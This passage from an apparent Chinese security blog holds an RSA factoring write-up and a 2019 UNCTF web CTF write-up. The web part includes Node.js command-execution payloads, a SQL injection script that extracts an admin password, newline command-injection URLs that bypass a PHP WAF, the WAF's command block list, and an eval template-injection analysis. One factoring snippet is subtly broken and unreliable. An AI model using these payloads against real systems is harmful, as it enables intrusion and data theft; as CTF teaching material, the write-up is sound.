"</span>+str(n/p))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="变体"><a href="#变体" class="headerlink" title="变体"></a>变体</h3><p>1980年，Richard Brent 发表了 rho 算法的一个更快的变体。 他使用了与Pollard相同的核心思想，但是使用了不同的循环检测方法，用相关的 Brent’s cycle finding method取代了 Floyd’s cycle-finding algorithm</p><p>他观察到，如果 $gcd(a,n)&gt;1$，那么$gcd(a*b,n)&gt;1$（b为任意正整数）。所以，取代Floyd’s cycle-finding algorithm的每一步都检查$gcd(a,n)$，他定义了一个$z，z=(x_2-x_3·(x_3-x_5……(x_{101}-x_{201} \pmod {n} $即每一百步才检查一次$gcd(x_i-x_j,n)$，这么作主要是为了加速结果。 但有时它可能会引入重复因子导致算法失败，例如当n是一个正方形时。 但是这样使用常规算法就好了。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>那么回过头来我们解最初出现的那一道题，题中，$p-1$和$q-1$有很明显的公因子2g，于是根据Further Attacks on Server-Aided RSA Cryptosystems中The first stage of the attack所提到的，为了分解n，我们只需要运用Pollard’s ρ algorithm，其中用于生成“伪随机”数列的多项式为：$g(x)=(x^{n-1}+3)$%$n$</p><p>python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x=(pow(x,n<span class="number">-1</span>,n)+<span class="number">3</span>)%n    <span class="comment">#pow(x,n-1,n)是为了减小数值，加速运算，</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span> <span class="params">(x1,x2)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1=mapx(x1)</span><br><span class="line">        x2=mapx(mapx(x2))</span><br><span class="line">        p=gcd(x1-x2,n)</span><br><span class="line">        <span class="keyword">if</span> (p == n):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"fail"</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">elif</span> (p!=<span class="number">1</span>):</span><br><span class="line">            print(<span class="string">"p: "</span>+str(p))</span><br><span class="line">            print(<span class="string">"q: "</span>+str(n/p))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pollard_rho(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">n= <span class="comment">#题目所给        </span></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/qanOpY2NcVIiwPu.png" alt="Pollard&#39;s ρ algorithm"></p><p>运行十来秒成功分解。</p><h3 id="UNCTF-simple-rsa"><a href="#UNCTF-simple-rsa" class="headerlink" title="UNCTF-simple_rsa"></a>UNCTF-simple_rsa</h3><p>前几天打的UNCTF其中有一道极其简单粗暴的rsa的题目</p><p>题目简单粗暴，给了$e,n,c$</p><p><img src="https://i.loli.net/2020/04/30/ADkIoxrlGgvdBif.png" alt="UNCTF-simple_rsa"></p><p>显然是要分解$n$得到$p$和$q$</p><p>但是，其中，$n$有2092位，除非人手超算~</p><p>但其实这里可以用到Pollard’s ρ algorithm，前面提到它的预期运行时间与被分解的合数的最小质因数大小的平方根成正比</p><p>而这么大的模数$n$，显然不可能只有$p,q$两个因数，否则真的是要让超算出动，</p><p>所以我们猜测$n$是由若干个小素数的乘积而来</p><p>于是利用Pollard’s ρ algorithm分解这个$n$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x=(x*x+<span class="number">1</span>)%n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span><span class="params">(x1,x2)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        x1 = mapx(x1)</span><br><span class="line">        x2 = mapx(mapx(x2))</span><br><span class="line">        p = gcd(a - i, n)</span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line">n=...</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (n!=<span class="number">1</span>):</span><br><span class="line">    p = pollard_rho(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">print</span> p</span><br><span class="line">    n = n / p</span><br></pre></td></tr></table></figure><p>跑个十来分钟应该可以得到</p><p><img src="https://i.loli.net/2020/04/30/xqjZMEIm2s39GQv.png" alt="1"></p><p>（我放着程序没管，跑了好几个小时后得到）</p><p><img src="https://i.loli.net/2020/04/30/97XTafejQdtK6x2.png" alt="2"></p><p>但其实有前面6个<code>740160703366837</code>大概已经是够了，<code>740160703366837</code>的6次方大概有90位，而如果flag是md5值得话，长度是32+6。由76位十六进制表示，最大由92位十进制表示（显然是不可能的，这个时候已经不是可打印字符了）所以90位作为n应该已经是够了。（再不济就再等一会儿,多出来几个就好了）</p><p>exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">e = 0x10001</span><br><span class="line">c = <span class="comment">#题目所给</span></span><br><span class="line">p = 740160703366837</span><br><span class="line">n = p**6</span><br><span class="line">c = c % n</span><br><span class="line">phi = (p-1)*(p**6)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line"><span class="section">print(hex(pow(c,d,n))[2:].decode('hex'))</span></span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191106003417-1ca71876-ffea-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191106003417-1ca71876-ffea-1.png" alt="img"></a></p><p>这里相当于我们直接把原题的$n$给纂改了，</p><p>但为啥这里我们可以直接改$n$呢？</p><p>这里再回顾一下基础知识好了</p><p>以下是 $M\equiv C^d pmod{N}$ 的证明</p><p><img src="https://i.loli.net/2020/04/30/zmodaOUq2NSv6IP.png" alt="RSA解密验证"></p><p>首先，看到这里要求$m&lt;n$，所以这里n_new大于m即可</p><p>其次，由于n_new | n，所以 c % n_new == pow(m ,e ,n_new)</p><p>推理如下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">          n = n_new * <span class="keyword">x</span></span><br><span class="line">          <span class="keyword">c</span> = m^e % n</span><br><span class="line">        m^e = k*n + <span class="keyword">c</span></span><br><span class="line">        m^e = k*n_new*<span class="keyword">x</span> + <span class="keyword">c</span></span><br><span class="line">m^e % n_new = <span class="keyword">c</span> % n_new</span><br></pre></td></tr></table></figure><p>所以只要新的N满足，$m&lt;N$, $m^e \equiv  c  \pmod {N}$，并且$gcd(e,phi(N))=1$，即可逆向求出$m$来。</p><p>而一般情况下$n=p*q$，所以基本不给你篡改$n$的机会~</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一次学习大概了解了</p><p>Further Attacks on Server-Aided RSA Cryptosystems，</p><p>Pollard’s ρ algorithm，</p><p>以及多素数RSA系统的其中一种解法，</p><p>最后，感谢Lur大佬的指点~</p><p><del>但虽然知道这个算法的流程，其实并不懂原理，好神奇的感觉，有没有大佬教教俺</del></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://en.wikipedia.org/wiki/Pollard's_kangaroo_algorithm" target="_blank" rel="noopener">Pollard’s rho algorithm</a></p><p><a href="http://www.hghhgghhg.top/2019/10/28/UNCTFWP/#simple-rsa" target="_blank" rel="noopener">UNCTF-simple-rsa Write-Up</a></p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Rsa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 UNCTF</title>
      <link href="/2019/11/08/2019UNCTF/"/>
      <url>/2019/11/08/2019UNCTF/</url>
      
        <content type="html"><![CDATA[<p>原文发表于<a href="https://www.anquanke.com/post/id/190613" target="_blank" rel="noopener">安全客</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="帮赵总征婚"><a href="#帮赵总征婚" class="headerlink" title="帮赵总征婚"></a>帮赵总征婚</h3><p>呃，帮不了赵总征婚~。</p><p>f12，有个hint：<code>&lt;!-- I like rockyou! --&gt;</code></p><p>上rockyou字典（不可能的，bp会炸，上top3000），直接爆，得到flag</p><p><a href="https://p5.ssl.qhimg.com/t01fe0b0209adb8549f.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01fe0b0209adb8549f.png" alt="img"></a></p><p>得到flag：flag{57fc636a42f46c7658110a631256f5cb}</p><h3 id="简单的备忘录"><a href="#简单的备忘录" class="headerlink" title="简单的备忘录"></a>简单的备忘录</h3><p>emmm，没学过的语言，进去各种fuzz，</p><p>发现打一个字母他就会给些选择</p><p><a href="https://p5.ssl.qhimg.com/t01b556d8884c351425.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01b556d8884c351425.png" alt="img"></a></p><p>最后随缘整出flag</p><p><a href="https://p3.ssl.qhimg.com/t01a82e3b736dd6d396.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01a82e3b736dd6d396.png" alt="img"></a></p><p>flag{3ad4aaedf408c147d5f747f7ce76d2b4}</p><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>进入是个聊天框，/name 改名字</p><p>/flag 会打印flag1flag1flag1….</p><p>/more 显示/flag – 小伙子…</p><p>/calc 可以计算，（猜测这里可能有命令执行）</p><p><a href="https://p5.ssl.qhimg.com/t01c07d61198ccbf3c5.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01c07d61198ccbf3c5.png" alt="img"></a></p><p>找到篇文章<a href="https://m.jb51.net/article/91411.htm`" target="_blank" rel="noopener">https://m.jb51.net/article/91411.htm`</a></p><p>于是试了试里面的payload：/calc require(‘child_process’).exec(‘ls’).toString()</p><p>返回了：血小板: [object Object]</p><p>然后试了试execSync：/calc require(‘child_process’).execSync(‘ls’).toString()</p><p>返回了：bin games include lib local sbin share src命令执行成功</p><p>于是读取flag：/calc require(‘child_process’).execSync(‘cat /flag’).toString()</p><p>返回：血小板: undefined</p><p>应该是空格的问题，那就用$IFS替代：/calc require(‘child_process’).execSync(‘cat$IFS/flag’).toString()</p><p>成功拿到flag</p><p><a href="https://p3.ssl.qhimg.com/t015673743622d5d679.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t015673743622d5d679.png" alt="img"></a></p><p>flag{0e4d1980ef6f8a81428f83e8e1c6e22b}</p><h3 id="Twice-Insert"><a href="#Twice-Insert" class="headerlink" title="Twice_Insert"></a>Twice_Insert</h3><p>刚开始还以为是原题，注册admin’#后改密码，然后用admin登录，发现并没有flag（可恶呢</p><p>但是，既然这个二次注入点还在，那仍然是可以被拿来利用的</p><p>在单引号和#中间就可以注入语句</p><p>各种fuzz后，发现很多函数都被waf了（smarter…harder…大概是有回显的盲注了）</p><p>最后，发现了这篇文章<a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://p1.ssl.qhimg.com/t017ee419351442a907.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t017ee419351442a907.png" alt="img"></a></p><p>于是试着构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"admin' and ascii(substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">distinct</span> database_name)<span class="keyword">from</span> mysql.innodb_index_stats),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">30</span><span class="comment">###vanish"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"admin' and ascii(substr((select group_concat(distinct table_name)from mysql.innodb_index_stats),1,1))=30###vanish"</span></span><br></pre></td></tr></table></figure><p>然后写一个自动化脚本。不断地注册，登录，改密码，然后根据回显按位爆破库、表即可</p><p>最终的payload：”admin’ and ascii(substr((select * from fl4g),%d,1))=%d###vanish”%(i,j)</p><p><a href="https://p1.ssl.qhimg.com/t0140ff12ae8dcf0041.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0140ff12ae8dcf0041.png" alt="img"></a></p><p>得到flag：UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}（不知道为啥，开头有时候会缺）</p><h3 id="NSB-Reset-Password"><a href="#NSB-Reset-Password" class="headerlink" title="NSB Reset Password"></a>NSB Reset Password</h3><p>注册-&gt;改密码：发验证码-&gt;重置密码</p><p>三个包抓过来，发现sessionID都没有变动过。</p><p>试着猜想这个改密码的逻辑：当我给自己的账户发邮件，然后输入验证码，验证通过后，这个sessionID就获得了更改密码的权利，但是是更改谁的密码呢？账户的信息想必是存在sessionID里的。</p><p>但经过测验，无论是给admin发邮件，还是给自己发邮件，sessionID都没有变过。那么，显然sessionID里的储存的账户信息的那部分是可以被覆盖的，所以解题流程：</p><p>先注册-&gt;更改密码：发送验证码-&gt;到重置密码的界面，此时再开一个窗口，发送更改admin密码的邮件（sessionID里的用户被覆盖为admin），然后又回去，更改密码（此时更改的就是sessionID里的账户，即admin的密码），然后用自己更改的密码登录admin账户即可获flag</p><p><a href="https://p5.ssl.qhimg.com/t01ba8c30adb43d2d38.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01ba8c30adb43d2d38.png" alt="img"></a></p><p>flag：flag{175f3098f80735ddfdfbd4588f6b1082}</p><h3 id="easy-admin"><a href="#easy-admin" class="headerlink" title="easy_admin"></a>easy_admin</h3><p>很容易发现在/index.php?file=forget这里存在注入</p><p>fuzz后发现过滤了and select where。。。</p><p>然后卡了好久不知道怎么查admin的密码，最后索性直接 password （bugku有一道过滤很严的题就是这样bypass，）</p><p>exp：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10045/index.php?file=forget"</span></span><br><span class="line"></span><br><span class="line">r = requests.Session()</span><br><span class="line"></span><br><span class="line">password=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="built_in">in</span> range(ord(<span class="string">'0'</span>),ord(<span class="string">'&#125;'</span>)):</span><br><span class="line">        <span class="keyword">data</span> = &#123;</span><br><span class="line">            <span class="string">"username"</span>:<span class="string">"-1'or ascii(substr((password),%d,1))=%d#"</span>%(i,j)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = r.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>)</span><br><span class="line">        #print res.<span class="keyword">text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"ok reset password"</span> <span class="built_in">in</span> res.<span class="keyword">text</span>:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            print password</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>得到密码：</p><p><a href="https://p1.ssl.qhimg.com/t01276c1041f642fd59.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01276c1041f642fd59.png" alt="img"></a></p><p>登录后yes you are admin, but you can’ to get the flag, because admin will access the website from</p><p>from where？</p><p>盲猜是127.0.0.1，然后再报文头加一个Referer，得到后一半flag</p><p><a href="https://p4.ssl.qhimg.com/t01cf6314a828f8eeed.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01cf6314a828f8eeed.png" alt="img"></a></p><p>flag：flag{nevertoolatetox}</p><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>php的正则有点小漏洞，两个斜杠丢进php只剩一个斜杠了，然后这个斜杠丢进正则就用来转义了</p><p>而这一题，出题人似乎是给了个hint</p><p><a href="https://p3.ssl.qhimg.com/t01b0ca65aa5a902b40.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01b0ca65aa5a902b40.png" alt="img"></a></p><p>这里故意换了下位置。</p><p>所以自己做了下实验，发现，由于这个小漏洞，a被过滤了|<em>而不是</em>，b被过滤了|\n，而不是被过滤了\n</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>['a'];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>['b'];</span><br><span class="line"><span class="comment">// try bypass it</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"</span>|,|;|\`|\\|\*|\<span class="keyword">n</span>|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\<span class="keyword">d</span>]|@|\||tail|bin|less|<span class="keyword">more</span>|string|<span class="keyword">nl</span>|<span class="keyword">pwd</span>|<span class="keyword">cat</span>|<span class="keyword">sh</span>|flag|find|<span class="keyword">ls</span>|grep|echo|w/is", <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">""</span>;</span><br><span class="line">    echo<span class="string">"waf-a\n"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\'|\"</span>|;|,|\`|\*|\\|\<span class="keyword">n</span>|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\<span class="keyword">d</span>]|@|\||tail|bin|less|<span class="keyword">more</span>|string|<span class="keyword">nl</span>|<span class="keyword">pwd</span>|<span class="keyword">cat</span>|<span class="keyword">sh</span>|flag|find|<span class="keyword">ls</span>|grep|echo|w/is", <span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">""</span>;</span><br><span class="line">    echo<span class="string">"waf-b"</span>;&#125;</span><br><span class="line">echo <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t010bbbade7d82cfd04.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t010bbbade7d82cfd04.png" alt="img"></a></p><p><a href="https://p2.ssl.qhimg.com/t0158c3f445ebc19a10.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t0158c3f445ebc19a10.png" alt="img"></a></p><p>同时，a,b就都可以用斜杠了，</p><p>于是就可以闭合引号后任意命令执行</p><p>对于命令的过滤有两种绕过方法，一个是linux下，用通配符?绕过，比如var写成v?r</p><p>解题：</p><ol><li><p><a href="http://101.71.29.5:10054/?a=\&amp;b=%0al\s%20/%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0al\s%20/%0a</a></p></li><li><p>flag不在根目录下，那就找找，</p></li></ol><ul><li><a href="http://101.71.29.5:10054/?a=\&amp;b=%0afin\d%20/va?/???/htm?/%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0afin\d%20/va?/???/htm?/%0a</a></li></ul><ol><li>找到了</li></ol><ul><li><a href="http://101.71.29.5:10054/?a=\&amp;b=%0aca\t%20/va?/???/htm?/.F1jh_/h3R3_1S_your_F1A9.txt%0a" target="_blank" rel="noopener">http://101.71.29.5:10054/?a=\&amp;b=%0aca\t%20/va?/???/htm?/.F1jh_/h3R3_1S_your_F1A9.txt%0a</a></li></ul><p><a href="https://p4.ssl.qhimg.com/t011ea19b8dc163f851.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t011ea19b8dc163f851.png" alt="img"></a></p><p>flag：unctf{86dfe85d7c5842c5c04adae104193ee1}</p><h3 id="审计一下世界上最好的语言吧"><a href="#审计一下世界上最好的语言吧" class="headerlink" title="审计一下世界上最好的语言吧"></a>审计一下世界上最好的语言吧</h3><p>先丢进Seay</p><p><a href="https://p5.ssl.qhimg.com/t01750cb1862de2f113.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01750cb1862de2f113.png" alt="img"></a></p><p>parse_template.php中有一个eval</p><p>查一下调用关系：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">index.php：parse_again($searchword);</span><br><span class="line"></span><br><span class="line">parse_template.php:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parse_again</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $template_html,$searchword;</span><br><span class="line">    $searchnum    = <span class="keyword">isset</span>($GLOBALS[<span class="string">'searchnum'</span>])?$GLOBALS[<span class="string">'searchnum'</span>]:<span class="string">""</span>;</span><br><span class="line">    $type      = <span class="keyword">isset</span>($GLOBALS[<span class="string">'type'</span>])?$GLOBALS[<span class="string">'type'</span>]:<span class="string">""</span>;</span><br><span class="line">    $typename = <span class="keyword">isset</span>($GLOBALS[<span class="string">'typename'</span>])?$GLOBALS[<span class="string">'typename'</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $searchword = substr(RemoveXSS($searchword),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $searchnum = substr(RemoveXSS($searchnum),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $type = substr(RemoveXSS($type),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $typename = substr(RemoveXSS($typename),<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:searchword&#125;"</span>,$searchword,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:searchnum&#125;"</span>,$searchnum,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:type&#125;"</span>,$type,$template_html);</span><br><span class="line">    $template_html = str_replace(<span class="string">"&#123;haha:typename&#125;"</span>,$typename,$template_html);</span><br><span class="line">    $template_html = parseIf($template_html);</span><br><span class="line">    <span class="keyword">return</span> $template_html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseIf</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($content,<span class="string">'&#123;if:'</span>)=== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $Rule = <span class="string">"/&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;/is"</span>;</span><br><span class="line">        preg_match_all($Rule,$content,$iar);</span><br><span class="line">        $arlen=count($iar[<span class="number">0</span>]);</span><br><span class="line">        $elseIfFlag=<span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">            $strIf=$iar[<span class="number">1</span>][$m];</span><br><span class="line">            $strIf=parseStrIf($strIf);</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"if("</span>.$strIf.<span class="string">") &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br></pre></td></tr></table></figure><p>然后看到template.html，搜索searchword和searchnum</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-film sea-text"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span></span><span class="template-variable">&#123;haha:searchword&#125;</span><span class="xml"> <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">small</span>&gt;</span>共有<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;haha:searchnum&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>个影片 第<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;searchlist:page&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>页<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>最后再看看RemoveXSS</p><p>发现 if:,</p><p>解题思路：</p><p>首先利用四次的strreplace绕过RemoveXss,控制$templatehtml</p><p>然后是绕过判断和正则：{if:开头、{end if}结尾，然后真正执行的命令要在rule匹配到的第一个（.*?）</p><p>破题：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$searchnum=&#123;end <span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line">$searchword=&#123;<span class="keyword">if</span>&#123;haha:<span class="keyword">type</span>&#125;</span><br><span class="line"></span><br><span class="line">$<span 